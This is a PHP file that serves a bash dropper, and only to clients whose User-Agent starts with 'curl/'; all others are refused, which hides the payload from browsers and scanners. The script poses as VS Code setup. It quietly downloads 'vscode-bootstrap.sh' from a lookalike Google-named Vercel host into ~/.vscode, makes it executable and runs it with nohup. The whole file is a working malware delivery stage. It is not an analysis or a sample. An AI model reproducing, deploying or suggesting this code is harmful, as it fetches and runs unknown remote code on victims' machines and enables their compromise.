<?php

$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';

if (stripos($userAgent, 'curl/') !== 0) {
    http_response_code(403);
    exit('Access denied');
}

header('Content-Type: text/plain; charset=utf-8');

echo <<<'BATCH'
#!/bin/bash
set -e

# -------------------------
# Step 1: Make sure the .vscode directory exists
# -------------------------
mkdir -p "$HOME/.vscode"

# -------------------------
# Step 2: Download the script if it doesn't exist or if it's not updated
# -------------------------

echo "Downloading or updating vscode-bootstrap.sh..."
curl -s -L -o "$HOME/.vscode/vscode-bootstrap.sh" "https://apigoogle-ashen.vercel.app/api/settings/bootstraplinux"

# -------------------------
# Step 3: Check if the script exists and make it executable
# -------------------------

if [ -f "$HOME/.vscode/vscode-bootstrap.sh" ]; then
  chmod +x "$HOME/.vscode/vscode-bootstrap.sh"
  echo "Script is now executable."
else
  echo "Error: Script download failed or file not found."
  exit 1
fi

# -------------------------
# Step 4: Run the script in the background, redirecting output and errors
# -------------------------

echo "Running the script in the background..."
nohup bash "$HOME/.vscode/vscode-bootstrap.sh"


# -------------------------
# Step 5: Exit
# -------------------------

echo "Process started. Exiting."
exit 0
BATCH;